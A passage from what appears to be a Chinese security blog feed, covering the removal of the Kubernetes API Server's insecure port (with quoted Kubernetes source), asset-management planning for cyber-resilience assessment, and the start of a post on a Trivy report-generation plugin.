 ReadOnlyPort: ports.KubeletReadOnlyPort,<br>      PreferredAddressTypes: []<span class="hljs-type">string</span>&#123;<br>        <span class="hljs-comment">// --override-hostname</span><br>        <span class="hljs-type">string</span>(api.NodeHostName),<br><br>        <span class="hljs-comment">// internal, preferring DNS if reported</span><br>        <span class="hljs-type">string</span>(api.NodeInternalDNS),<br>        <span class="hljs-type">string</span>(api.NodeInternalIP),<br><br>        <span class="hljs-comment">// external, preferring DNS if reported</span><br>        <span class="hljs-type">string</span>(api.NodeExternalDNS),<br>        <span class="hljs-type">string</span>(api.NodeExternalIP),<br>      &#125;,<br>      HTTPTimeout: time.Duration(<span class="hljs-number">5</span>) * time.Second,<br>    &#125;,<br>    ServiceNodePortRange: kubeoptions.DefaultServiceNodePortRange,<br>  &#125;<br><br>  <span class="hljs-comment">// Overwrite the default for storage data format.</span><br>  s.Etcd.DefaultStorageMediaType = <span class="hljs-string">&quot;application/vnd.kubernetes.protobuf&quot;</span><br><br>  <span class="hljs-keyword">return</span> &amp;s<br>&#125;<br></code></pre></td></tr></table></figure><p>并且 <code>--insecure-port</code> 只能设置为 <code>0</code>，表示关闭不安全的服务。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> delete this check after insecure flags removed in v1.24</span><br><span class="hljs-comment">// 代码片段链接：https://github.com/kubernetes/kubernetes/blob/4a89df5617b8e1e26abb16150502d04e6c180533/cmd/kube-apiserver/app/server.go#L92</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkNonZeroInsecurePort</span><span class="hljs-params">(fs *pflag.FlagSet)</span></span> <span class="hljs-type">error</span> &#123;<br>  <span class="hljs-keyword">for</span> _, name := <span class="hljs-keyword">range</span> options.InsecurePortFlags &#123;<br>    val, err := fs.GetInt(name)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>      <span class="hljs-keyword">return</span> err<br>    &#125;<br>    <span class="hljs-keyword">if</span> val != <span class="hljs-number">0</span> &#123;<br>      <span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;invalid port value %d: only zero is allowed&quot;</span>, val)<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>如果强行将 <code>--insecure-port</code> 标志设置为非 0 端口，例如 8080，API Server 将会报错无法提供服务。只有将 <code>--insecure-port</code> 改回为 0 后，APIserver 恢复正常。</p><p><img src="/image/apiserver-baocuo.png" alt="图 7：APIServer 报错"></p><p>图 7：–insecure-port 设置为非 0 端口，APIServer 会报错</p><p><img src="/image/apiserver-huifu.jpg" alt="图 8：APIServer 恢复"></p><p>图 8：–insecure-port 设置为 0 端口后，APIServer 恢复正常。</p><p>通过限制端口的配置，Kubernetes 无需修改 <code>--insecure-bind-address</code> 的相关代码，即可关闭不安全的服务。</p><p>所以，Kubernetes 自 v1.20.0 版本之后，<code>--insecure-bind-address</code> 和 <code>--insecure-port</code> 这两个 Flag 将不再起任何作用了。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> remove these insecure flags in v1.24</span><br><span class="hljs-comment">// 代码片段链接：https://github.com/kubernetes/kubernetes/blob/4a89df5617b8e1e26abb16150502d04e6c180533/cmd/kube-apiserver/app/options/options.go#L146</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">addDummyInsecureFlags</span><span class="hljs-params">(fs *pflag.FlagSet)</span></span> &#123;<br>  <span class="hljs-keyword">var</span> (<br>    bindAddr = net.IPv4(<span class="hljs-number">127</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>    bindPort <span class="hljs-type">int</span><br>  )<br><br>  <span class="hljs-keyword">for</span> _, name := <span class="hljs-keyword">range</span> []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;insecure-bind-address&quot;</span>, <span class="hljs-string">&quot;address&quot;</span>&#125; &#123;<br>    fs.IPVar(&amp;bindAddr, name, bindAddr, <span class="hljs-string">&quot;&quot;</span>+<br>      <span class="hljs-string">&quot;The IP address on which to serve the insecure port (set to 0.0.0.0 for all IPv4 interfaces and :: for all IPv6 interfaces).&quot;</span>)<br>    fs.MarkDeprecated(name, <span class="hljs-string">&quot;This flag has no effect now and will be removed in v1.24.&quot;</span>)<br>  &#125;<br><br>  <span class="hljs-keyword">for</span> _, name := <span class="hljs-keyword">range</span> InsecurePortFlags &#123;<br>    fs.IntVar(&amp;bindPort, name, bindPort, <span class="hljs-string">&quot;&quot;</span>+<br>      <span class="hljs-string">&quot;The port on which to serve unsecured, unauthenticated access.&quot;</span>)<br>    fs.MarkDeprecated(name, <span class="hljs-string">&quot;This flag has no effect now and will be removed in v1.24.&quot;</span>)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x05-不安全的服务被移除"><a href="#0x05-不安全的服务被移除" class="headerlink" title="0x05 不安全的服务被移除"></a>0x05 不安全的服务被移除</h2><p>2022 年 5 月 25 日，Kubernetes 发布了 v1.24.0 版本，在这次的发布信息中，Kubernetes 终于将 <code>--insecure-bind-address</code> 和 <code>--insecure-port</code> 两个 Flag 完全移除。</p><p>若您还在使用这两个 Flag，API Server 将报错、无法启动。至此，不安全的服务将完全退出历史舞台。</p><p><img src="/image/image_HjrwllqiXF.png" alt="图 9：Kubernetes v1.24 的 Change Log"></p><p>图 9：Kubernetes v1.24 的 Change Log</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>本篇文章，我们讨论了 API Server 不安全服务的前世今生。在实际工作和学习中，我们只需要记住一点：<strong>任何不谈及 Kubernetes 版本的安全风险指南都是耍流氓</strong>。</p><p>当我们获取到一个 Kubernetes 集群时，需要关注其版本信息：</p><ul><li><p>2018 年 3 月 7 日，Kubernetes 发布了 v1.10.0 版本，宣称弃用<code>--insecure-bind-address</code> 和 <code>--insecure-port</code> 这两个标志，这相当于被宣判了“死缓”，因为我们仍然可以使用这两个 Flag，将 API Server 配置为可远程访问。</p></li><li><p>2020 年 12 月 9 日，Kubernetes 发布了 v1.20.0 版本，在这之后，您无法将 <code>--insecure-port</code> 的设置为非 0 值，因为 API Server 不安全服务已关闭。</p></li><li><p>2022 年 5 月 25 日，Kubernetes 发布了 v1.24.0 版本，API Server 不安全服务已完全退出历史舞台。</p></li></ul><p>说到这里，你是否需要去看看自己的集群是哪个版本呢？</p><p><img src="/image/image_3.png" alt="图 10：总结"></p><p>Kubernetes 是一个非常著名的开源项目，它结合了来自世界各地的开源爱好者的智慧和力量，不断的进行更新与迭代，也许在今天或明天，就解决了某个安全风险、或引入新的安全风险。</p><p>不安全的服务所带来的风险被完全解决了，但安全的服务未必始终是安全的。下一讲，我们来说说 Kubernetes 开放在 6443 端口的安全服务，敬请期待～</p>]]></content>
    
    
    
    <tags>
      
      <tag>Kubernetes 安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【网络安全韧性评估】资产管理领域（二）：资产管理计划</title>
    <link href="/2024/11/14/%E3%80%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9F%A7%E6%80%A7%E8%AF%84%E4%BC%B0%E3%80%91%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E9%A2%86%E5%9F%9F%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E8%AE%A1%E5%88%92/"/>
    <url>/2024/11/14/%E3%80%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9F%A7%E6%80%A7%E8%AF%84%E4%BC%B0%E3%80%91%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E9%A2%86%E5%9F%9F%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E8%AE%A1%E5%88%92/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在这一讲中，我们采用了 5W2H 的方法对资产管理的计划进行了解读。</p><p><img src="/image/648.png" alt="图 1:5W2H 分析法" title="图 1:5W2H 分析法"></p><p><img src="/image/649.png" alt="图 2：资产管理计划" title="图 2：资产管理计划"></p><p>在开启资产管理计划之前，组织需要先完成准备工作。资产管理计划的主要内容如下所示。资产管理计划结束后，会需要有个输出内容。</p><p><img src="/image/650.png" alt="图 3：资产管理计划所包含的内容" title="图 3：资产管理计划所包含的内容"></p><h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h2><p>下面清单总结了组织在开始制定资产管理计划之前需要完成的任务以及需要收集的信息。</p><table><thead><tr><th>输入</th><th>说明</th></tr></thead><tbody><tr><td>范围声明</td><td>本声明需要定义资产管理计划和方案需要解决的问题。资产管理至少应涵盖支持组织关键服务的所有资产。不确定从何处着手的组织应将重点放在最基本的服务和直接影响其使命的领域上。这种方法可以让组织首先解决风险最大的领域，并减轻其影响。如果您的组织参与过网络安全韧性评估，那么从网络安全韧性评估期间处理的关键服务开始可能会比较好。</td></tr><tr><td>利益相关者名单</td><td>利益相关者名单应与范围声明保持一致，并包括所有适当的内部和外部实体。潜在候选人包括： - 执行和高级管理层 - 业务线负责人，尤其是关键服务所有者 - 信息技术 - 法务 - 董事会 - 技术供应商 - 监管机构和审计员 - 合规人员</td></tr><tr><td>管理支持</td><td>高级管理层对建立资产管理程序和实施流程的支持</td></tr><tr><td>对可接受的资产管理方法的理解和认可</td><td>管理层对拟采用资产管理方法的接受，包括利益相关者对已识别的关键资产和服务可接受风险容忍度的期望。</td></tr><tr><td>外部强加的资产管理要求。</td><td>规定资产定义的强制性要求的监管要求；还包括其他需求，如服务水平协议要求。</td></tr><tr><td>风险</td><td>分类和优先级排序的风险列表。</td></tr><tr><td>资产管理的责任分配</td><td>资产管理工作职责描述，例如：执行所有权、决策、沟通、测试和中断风险管理：</td></tr><tr><td>资产管理预算</td><td>识别用于执行资产管理规划和实施的可用资金，包括： - 人员资源 - 工具（应用程序及相关硬件） - 第三方支持 - 用于纠正资产管理过程中识别出的问题的资金</td></tr></tbody></table><h2 id="0x02-资产管理计划获得支持"><a href="#0x02-资产管理计划获得支持" class="headerlink" title="0x02 资产管理计划获得支持"></a>0x02 资产管理计划获得支持</h2><h3 id="2-1-为什么需要获得领导层的支持？"><a href="#2-1-为什么需要获得领导层的支持？" class="headerlink" title="2.1 为什么需要获得领导层的支持？"></a>2.1 为什么需要获得领导层的支持？</h3><p>获得管理层的支持对于确保资产管理计划的有效实施至关重要。</p><p>自上而下的方法通常有助于组织的资产管理计划满足其韧性目标。</p><h3 id="2-2-获得领导层的支持的目的是什么？"><a href="#2-2-获得领导层的支持的目的是什么？" class="headerlink" title="2.2 获得领导层的支持的目的是什么？"></a>2.2 获得领导层的支持的目的是什么？</h3><p>管理层可以通过<strong>提供适当的资金、监督和人员配置来支持资产管理计划</strong>。</p><p>自上而下的方法还可以<strong>让资产管理的统一方法论能够跨越组织界限进行实施</strong>。</p><h3 id="2-3-需要获取的领导层的支持程度是多少？"><a href="#2-3-需要获取的领导层的支持程度是多少？" class="headerlink" title="2.3 需要获取的领导层的支持程度是多少？"></a>2.3 需要获取的领导层的支持程度是多少？</h3><p>**所需的管理层支持程度取决于资产在组织中的位置。**对于涉及整个组织的资产管理计划，需要高级执行层的支持。像服务层面这样的较小规模的实施，可能只需要负责该特定服务的管理层的支持。</p><p>例如，在一个电力公用事业组织中，若有四个业务单位分别提供发电、输电、配电和业务支持服务，那么每个业务单位都构成了该组织的一个服务层。</p><p>若要为这些服务单独实施资产管理计划，那么支持应该来自各自业务单位的管理层；若要求所有的业务单位实施共同的资产管理计划，那么支持应该来自电力公用事业的资深管理层。</p><h2 id="0x03-识别服务"><a href="#0x03-识别服务" class="headerlink" title="0x03 识别服务"></a>0x03 识别服务</h2><blockquote><p>这里的服务指的是组织在履行职责或生产产品过程中，所进行的有限数量的活动。</p></blockquote><h3 id="3-1-为什么要识别服务？"><a href="#3-1-为什么要识别服务？" class="headerlink" title="3.1 为什么要识别服务？"></a>3.1 为什么要识别服务？</h3><p>在组织中识别资产可能是一项艰巨的任务，因此组织应首先识别其提供的服务。</p><p>然后，<strong>组织可以通过梳理支持这些服务的资产来识别资产，并将资产整体划分为可管理的部分</strong>。</p><h3 id="3-2-识别服务的信息来源有哪些？"><a href="#3-2-识别服务的信息来源有哪些？" class="headerlink" title="3.2 识别服务的信息来源有哪些？"></a>3.2 识别服务的信息来源有哪些？</h3><p>服务通常与特定的组织相对应，但服务可以在业务单位之间共享，并跨越组织界限。例如，大型组织的全球供应链将跨越许多组织界限。</p><p><strong>确定组织服务可能有用信息的来源包括：</strong></p><ul><li><strong>战略计划</strong></li><li><strong>商业计划</strong></li><li><strong>合同</strong></li><li><strong>客户请求</strong></li><li><strong>标准工作流程</strong></li></ul><p>**服务可以是面向外部，也可以是面向内部的。**面向外部的服务通常是面向客户的，而且通常是容易识别的服务，因为它们涉及已知的商品。为了实现外部服务的使命，组织还应该考虑其内部服务，例如：招聘流程、绩效评估和培训计划等。</p><p><img src="/image/651.png" alt="表 2：不同的关键基础设施和他们可能提供的关键服务" title="表 2：不同的关键基础设施和他们可能提供的关键服务"></p><blockquote><p>内部服务：指组织内部各部门、团队和流程等提供的支持性服务，这些服务不直接面向外部客户，而是用于帮助组织内部的其他单位有效地运作，以便实现组织的整体目标和使命。</p><p>外部服务：指那些直接面向客户的服务，它们通常专注于组织生产或提供的具体产品，目的是满足外部客户的需求，增强客户体验，并促进组织的市场表现和业务增长。</p></blockquote><h3 id="3-3-如何进行服务识别工作"><a href="#3-3-如何进行服务识别工作" class="headerlink" title="3.3 如何进行服务识别工作"></a>3.3 如何进行服务识别工作</h3><p>为了方便服务的识别工作，组织应考虑<strong>使用一种文档记录方法来跟踪已识别的服务</strong>，例如：电子表格、配置控制的文档或数据库等。</p><p><img src="/image/652.png" alt="图 4：服务记录表格示例" title="图 4：服务记录表格示例"></p><h2 id="0x04-对服务进行优先级排序"><a href="#0x04-对服务进行优先级排序" class="headerlink" title="0x04 对服务进行优先级排序"></a>0x04 对服务进行优先级排序</h2><h3 id="4-1-为什么要对服务进行优先级排序？"><a href="#4-1-为什么要对服务进行优先级排序？" class="headerlink" title="4.1 为什么要对服务进行优先级排序？"></a>4.1 为什么要对服务进行优先级排序？</h3><p>组织在识别了所提供的所有服务过后，应当对这些服务进行优先级排序，以确定高价值服务。这里的高价值服务指的是：对于组织完成其使命而言，至关重要的服务，一旦这些服务失败，可能会阻碍组织战略目标的实现。</p><p><img src="/image/653.png" alt="图 5：关键服务可能因流程失败或特定资产（如信息和技术）的失败而受到干扰" title="图 5：关键服务可能因流程失败或特定资产（如信息和技术）的失败而受到干扰"></p><h3 id="4-2-对服务进行优先级排序应考虑的因素有哪些？"><a href="#4-2-对服务进行优先级排序应考虑的因素有哪些？" class="headerlink" title="4.2 对服务进行优先级排序应考虑的因素有哪些？"></a>4.2 对服务进行优先级排序应考虑的因素有哪些？</h3><p>组织必须根据服务的优先级，来为服务分配价值。在优先级排序和价值分配时，组织应该考虑如下因素：</p><ul><li><strong>业务影响分析（business impacts analysis，简称 BIA）的结果</strong></li><li><strong>服务或业务连续性计划</strong></li><li><strong>在风险评估活动中识别的服务风险后果</strong></li><li><strong>战略目标</strong></li><li><strong>安全分类</strong></li></ul><h3 id="4-3-如何进行优先级排序工作"><a href="#4-3-如何进行优先级排序工作" class="headerlink" title="4.3 如何进行优先级排序工作"></a>4.3 如何进行优先级排序工作</h3><p>一旦组织对其服务进行了优先级排序工作，就应该<strong>使用之前选择的文档工具来记录这些信息</strong>。</p><p>然后，<strong>按照比例为其最重要的服务分配资源和预算</strong>，以进行资产识别等韧性活动。</p><h2 id="0x05-建立一个通用的资产的定义"><a href="#0x05-建立一个通用的资产的定义" class="headerlink" title="0x05 建立一个通用的资产的定义"></a>0x05 建立一个通用的资产的定义</h2><p>组织在了解了实现其使命所需要的服务之后，需要定义为这些服务提供支持的资源。<strong>资源是服务运行所需要的原始材料，包括：人员、信息、技术和设施。</strong></p><h3 id="5-1-人员"><a href="#5-1-人员" class="headerlink" title="5.1 人员"></a>5.1 人员</h3><p>**人员资产指的是对组织服务进行操作和监控的关键员工。**组织内部的人员（有时还包括外部人员）负责执行流程和程序，以确保服务能够实现组织的使命。</p><p><img src="/image/654.png" alt="表 3：内部和外部的人员资产示例" title="表 3：内部和外部的人员资产示例"></p><p>在识别人员资产时，组织<strong>应考虑成功运营一项服务所必需的关键角色，而不是实际担任该角色的人</strong>。建议每个角色都包含一个明确列出的职能或责任清单，以履行该角色的职责。</p><blockquote><p>为每个角色定义职能将帮助组织确保人员具备足够的能力来执行该角色，并且可以有不止一个人来支持该角色。这也有助于在发现人员不足时识别培训需求。</p></blockquote><h3 id="5-2-信息"><a href="#5-2-信息" class="headerlink" title="5.2 信息"></a>5.2 信息</h3><p><strong>信息资产是指任何媒体上所需的、用于组织服务成功运行的信息或数据</strong>。信息资产也可以是服务的输出或副产品。</p><p><img src="/image/655.png" alt="表 4：信息资产的示例" title="表 4：信息资产的示例"></p><p>信息可以是位或字节、文件或文档，也可以是存储在数据库中的集体信息。<strong>组织必须确定它希望定义信息资产的粒度</strong>。</p><h3 id="5-3-技术"><a href="#5-3-技术" class="headerlink" title="5.3 技术"></a>5.3 技术</h3><h4 id="5-3-1-什么是技术资产"><a href="#5-3-1-什么是技术资产" class="headerlink" title="5.3.1 什么是技术资产"></a>5.3.1 什么是技术资产</h4><p><strong>技术资产包括软件、硬件、固件以及任何物理连接</strong>。</p><h4 id="5-3-2-技术资产在哪里"><a href="#5-3-2-技术资产在哪里" class="headerlink" title="5.3.2 技术资产在哪里"></a>5.3.2 技术资产在哪里</h4><p>技术资产可以位于组织内的任何地方，由组织决定如何描述这些技术资产。</p><h4 id="5-3-3-如何识别技术资产"><a href="#5-3-3-如何识别技术资产" class="headerlink" title="5.3.3 如何识别技术资产"></a>5.3.3 如何识别技术资产</h4><p>推荐从网络设备级别开始，在那里可以识别到常见的网络组件，如路由器、服务器和交换机。</p><p>然后，继续识别个人计算设备，如台式电脑、笔记本电脑和平板电脑。</p><h4 id="5-3-4-技术识别应该做到什么程度"><a href="#5-3-4-技术识别应该做到什么程度" class="headerlink" title="5.3.4 技术识别应该做到什么程度"></a>5.3.4 技术识别应该做到什么程度</h4><p>将设备归类到广泛的类别中，为组织提供了一个基础，使得组织能够在其基础设施中唯一地识别每一台设备。</p><p>同时，这也为组织设定了管理的范围和控制边界，以便更有效地进行管理和维护。</p><h3 id="5-4-设施"><a href="#5-4-设施" class="headerlink" title="5.4 设施"></a>5.4 设施</h3><p><strong>设施资产是指组织在提供或执行服务时所依赖的任何物理场所</strong>。设施可以由组织拥有和控制，也可以由外部业务伙伴控制。</p><p><img src="/image/656.png" alt="表 5：设施资产的示例" title="表 5：设施资产的示例"></p><p>设施资产容纳了前面讨论的人员、技术以及信息资产，并且<strong>所有资产的保护策略必须进行整合</strong>。</p><h2 id="0x06-输出内容"><a href="#0x06-输出内容" class="headerlink" title="0x06 输出内容"></a>0x06 输出内容</h2><table><thead><tr><th>输出</th><th>说明</th></tr></thead><tbody><tr><td>服务优先级列表</td><td>一个清晰的优先级列表，明确标识出价值最高的服务。</td></tr><tr><td>资产定义</td><td>组织的资产被明确定义，以便负责识别资产的利益相关者可以一致地记录它们。</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>安全建设</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【网络安全韧性评估】资产管理领域（一）：概述</title>
    <link href="/2024/11/13/%E3%80%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9F%A7%E6%80%A7%E8%AF%84%E4%BC%B0%E3%80%91%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E9%A2%86%E5%9F%9F%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E6%A6%82%E8%BF%B0/"/>
    <url>/2024/11/13/%E3%80%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%9F%A7%E6%80%A7%E8%AF%84%E4%BC%B0%E3%80%91%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E9%A2%86%E5%9F%9F%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>资产管理的目的在于：为组织建立一份详尽的高价值资产清单，并制定这些资产在其整个生命周期中的管理方式，这是确保组织在提供核心服务时能够保持持续生产力的关键。</p><p>任何对这些资产运行的中断事件都有可能阻碍组织实现其使命。为了应对潜在的干扰，资产管理策略显得尤为重要，它有助于识别并采取适当的策略，确保资产即使在遭受干扰事件期间也能保持生产力。</p><p><strong>资产管理领域专注于组织内部资产的计划、识别、记录和管理过程。</strong></p><p>如图 1 所示，这一流程旨在帮助组织满足其资产管理目标。</p><p><img src="/image/647.png" alt="图 1：资产管理的流程" title="图 1：资产管理的流程"></p><p>本指南的核心在于明确资产如何与支撑组织实现其使命的服务紧密相连。为了有效地进行资产管理，组织需动员不同层级的管理者和员工共同参与到资产的计划、识别、记录和管理工作中。</p><p>为了提供清晰的指导，下面的从较高的层次突出展示了资产管理领域的关键工作内容，并引导读者深入查阅本指南中的相关细节，以便更好地理解和执行资产管理策略。</p><h2 id="0x01-资产管理计划"><a href="#0x01-资产管理计划" class="headerlink" title="0x01 资产管理计划"></a>0x01 资产管理计划</h2><p>资产管理能够为组织提供任意时间点上的基础设施内所有资产的快照，所以制定并遵循计划对于高效地管理资产至关重要。资产管理计划应该包括以下内容：</p><ol><li><strong>资产管理计划获得支持</strong>：资产管理计划需要获得更高级别的管理层的支持，以确保其流程有足够的资金和人员配备并得以执行；</li><li><strong>识别服务</strong>：识别组织所执行或提供的所有关键业务的服务；</li><li><strong>对服务进行优先级排序</strong>：根据服务因故障而中断所造成的影响，对服务进行优先级排序，以便组织可以集中资源维护核心业务服务；</li><li><strong>建立一个通用的资产的定义</strong>：最后，资产管理计划要求组织在其基础设施内建立一个通用的资产的定义。</li></ol><p><img src="/image/643.png" alt="图 2：资产管理计划应该包括的内容" title="图 2：资产管理计划应该包括的内容"></p><blockquote><p>这里的服务指的是组织在执行其职责或进行生产时，所进行的一系列活动。</p></blockquote><h2 id="0x02-识别资产"><a href="#0x02-识别资产" class="headerlink" title="0x02 识别资产"></a>0x02 识别资产</h2><p>资产识别的工作主要包括识别关键服务及所支持依赖的资产。在进行这项工作时，组织应该根据所考虑的关键服务的特点和要求，将责任分配给合适的组织层级。</p><p>本指南将资产分为人员、信息、技术和设施共四个类别。需要注意的是，这些资产可能是组织内部的，也可能位于商业伙伴或其他外部实体中。资产识别的工作应该包括以下内容：</p><ol><li><strong>指定负责识别支持关键服务所需资产的责任人；</strong></li><li><strong>识别人员资产；</strong></li><li><strong>识别信息资产；</strong></li><li><strong>识别技术资产；</strong></li><li><strong>识别设施资产。</strong></li></ol><p><img src="/image/644.png" alt="图 3：资产的识别应该包括的内容" title="图 3：资产的识别应该包括的内容"></p><h2 id="0x03-记录资产"><a href="#0x03-记录资产" class="headerlink" title="0x03 记录资产"></a>0x03 记录资产</h2><p>一旦这些资产被识别，那么对它们进行记录就尤为重要了。资产记录主要为了了解：</p><ul><li>资产与组织的关系（例如：内部或外部）；</li><li>谁负责该资产；</li><li>资产在面对各种可能的中断事件时，所具备的防护能力和韧性；</li><li>资产对关键服务的重要性；</li><li>资产在其生命周期中可能遭受的变动或更新；</li></ul><p>这份文档通常包括以下内容：</p><ol><li>资产类型（人员、信息、技术或设施）</li><li>资产的敏感性分类（通常仅针对信息资产）</li><li>资产位置（通常是资产保管人管理资产的地方）</li><li>资产所有者和保管人（特别是如果资产位于组织外部时）</li></ol><p><img src="/image/645.png" alt="图 4：资产记录应该包括的信息" title="图 4：资产记录应该包括的信息"></p><h2 id="0x04-管理资产"><a href="#0x04-管理资产" class="headerlink" title="0x04 管理资产"></a>0x04 管理资产</h2><p>组织不仅需要对其资产和库存进行管理，还需要采取措施改进资产管理的流程。</p><p>组织应该选择对应的工具和方法（例如：配置数据库、图纸和变更控制等）来对资产进行管理，并确定这些工具在内部该如何使用。管理资产的工作应该包括以下内容：</p><ol><li>识别变更标准</li><li>建立变更计划</li><li>管理资产和库存的变更</li><li>变更发生时更新资产清单</li><li>改进流程</li></ol><p><img src="/image/646.png" alt="图 5：资产管理应该包括的内容" title="图 5：资产管理应该包括的内容"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>接下来，我们来说明实施上述资产管理流程规划的步骤，已经拥有资产管理计划的组织可以通过使用本资源指南中的指导来评估和改进其计划。</p><ol><li><p>资产管理计划</p><ol><li><p>资产管理计划获得支持</p></li><li><p>识别服务</p></li><li><p>对服务进行优先级排序</p></li><li><p>建立一个通用的资产的定义</p></li></ol></li><li><p>识别资产</p><ol><li>定负责识别支持关键服务所需资产的责任人</li><li>识别人员资产</li><li>识别信息资产</li><li>识别技术资产</li><li>识别设施资产</li></ol></li><li><p>记录资产</p><ol><li>创建资产清单</li><li>记录资产与关键服务之间的关系</li><li>分析支持多项服务的资产之间的依赖关系</li><li>更新资产清单</li></ol></li><li><p>管理资产</p><ol><li>识别变更标准</li><li>建立变更计划</li><li>管理资产和库存的变更</li><li>变更发生时更新资产清单</li><li>改进流程</li></ol></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>安全建设</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Trivy 报告生成插件：trivy-plugin-report</title>
    <link href="/2024/10/24/Trivy-%E6%8A%A5%E5%91%8A%E7%94%9F%E6%88%90%E6%8F%92%E4%BB%B6%EF%BC%9Atrivy-plugin-report/"/>
    <url>/2024/10/24/Trivy-%E6%8A%A5%E5%91%8A%E7%94%9F%E6%88%90%E6%8F%92%E4%BB%B6%EF%BC%9Atrivy-plugin-report/</url>
    
    <content type="html"><![CDATA[<p>📊 <code>trivy-plugin-report</code> 是一个可以将 <a href="https://github.com/aquasecurity/trivy">Trivy</a> 输出的 JSON 格式的报告转换为 EXCEL 和 Markdown 的插件。</p><h2 id="🤔-为什么需要它？"><a href="#🤔-为什么需要它？" class="headerlink" title="🤔 为什么需要它？"></a>🤔 为什么需要它？</h2><p>Trivy 可以输出多种格式的报告，但这些报告更适合技术人员使用。</p><p>在业务场景中，我们经常需要将安全风险以更易于理解的方式呈现给非技术人员，<br>这时候 EXCEL 文件就显得尤为重要。</p><p>此外，我们还需写一份综合性的扫描报告，该报告将概述制品信息、镜像配置、漏洞概览以及详细的漏洞信息。<br>Markdown 格式的文档因其便于编辑和查阅的特点，非常适合作为此类报告的载体。</p><h2 id="🌟-特性"><a href="#🌟-特性" class="headerlink" title="🌟 特性"></a>🌟 特性</h2><ul><li><strong>Trivy 兼容性</strong>：支持 Trivy 生成的 JSON 格式报告；</li><li><strong>办公友好</strong>：转换为 EXCEL 格式，适合非技术人员阅读和汇报；</li><li><strong>便捷编辑共享</strong>：Markdown 格式的扫描报告，便于快速编辑和共享关键安全信息。</li></ul><h2 id="🛠️-安装方法"><a href="#🛠️-安装方法" class="headerlink" title="🛠️ 安装方法"></a>🛠️ 安装方法</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">trivy plugin install github.com/miao2sec/trivy-plugin-report<br></code></pre></td></tr></table></figure><h2 id="🚀-使用方法"><a href="#🚀-使用方法" class="headerlink" title="🚀 使用方法"></a>🚀 使用方法</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">trivy image --format json -d --output plugin=report [--output-plugin-arg plugin_flags] &lt;image_name&gt;<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">trivy image -f json &lt;image_name&gt; | trivy report [plugin_flags]<br></code></pre></td></tr></table></figure><h2 id="📝-常见用法"><a href="#📝-常见用法" class="headerlink" title="📝  常见用法"></a>📝  常见用法</h2><ol><li><p>生成 EXCEL 表格，并命名为 <code>output.xlsx</code>：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image -f json debian:12 | trivy report --excel-file output.xlsx<br></code></pre></td></tr></table></figure><p> <img 